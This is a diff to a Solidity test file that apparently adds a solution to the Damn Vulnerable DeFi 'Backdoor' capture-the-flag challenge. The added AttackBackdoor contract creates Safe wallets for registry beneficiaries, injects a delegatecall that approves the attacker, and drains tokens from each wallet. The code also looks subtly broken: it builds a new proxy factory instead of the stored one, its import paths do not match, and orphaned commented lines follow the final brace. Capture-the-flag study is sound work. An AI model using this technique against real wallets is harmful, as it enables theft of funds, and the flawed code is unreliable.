@@ -7,6 +7,8 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -96,15 +98,64 @@ contract BackdoorChallenge is Test {
 }
 
 contract AttackBackdoor {
+    address private immutable singletonCopy;
+    address private immutable walletFactory;
+    address private immutable WalletRegistry;
     DamnValuableToken token;
+    address recovery;
+
+    constructor(
+        address _singletonCopy,
+        address _walletFactory,
+        address _WalletRegistry,
+        address _token,
+        address _recovery
+    ) {
+        singletonCopy = _singletonCopy;
+        walletFactory = _walletFactory;
+        WalletRegistry = _WalletRegistry;
+        token = DamnValuableToken(_token);
+        recovery = _recovery;
+    }
     function delegateApprove(address _spender) external {
         token.approve(_spender, 10 ether);
     }
 
     function attack(address[] memory beneficiaries) external {
+        // create  4 wallets for each beneficiary
         for (uint256 i = 0; i < 4; i++) {
-            address[] memory beneficiaries = new address[](1);
-            beneficiaries[0] = beneficiaries[1];
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = beneficiaries[i];
+
+            bytes memory _initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                beneficiary,
+                1,
+                address(this),
+                abi.encodeWithSignature("delegateApprove(address)", address(this)),
+                address(0),
+                0, // 0 is ETH
+                0,
+                address(0)
+            );
+
+            // create new proxy on behalf of the beneficiary
+            SafeProxy _newProxy = new SafeProxyFactory().createProxyWithCallback(
+                singletonCopy,
+                _initializer,
+                i,
+                IProxyCreationCallback(WalletRegistry)
+            );
+
+            token.transferFrom(address(_newProxy), recovery, 10 ether);
         }
     }
 }
+        // address[] calldata _owners,
+        // uint256 _threshold,
+        // address to,
+        // bytes calldata data,
+        // address fallbackHandler,
+        // address paymentToken,
+        // uint256 payment,
+        // address payable paymentReceiver
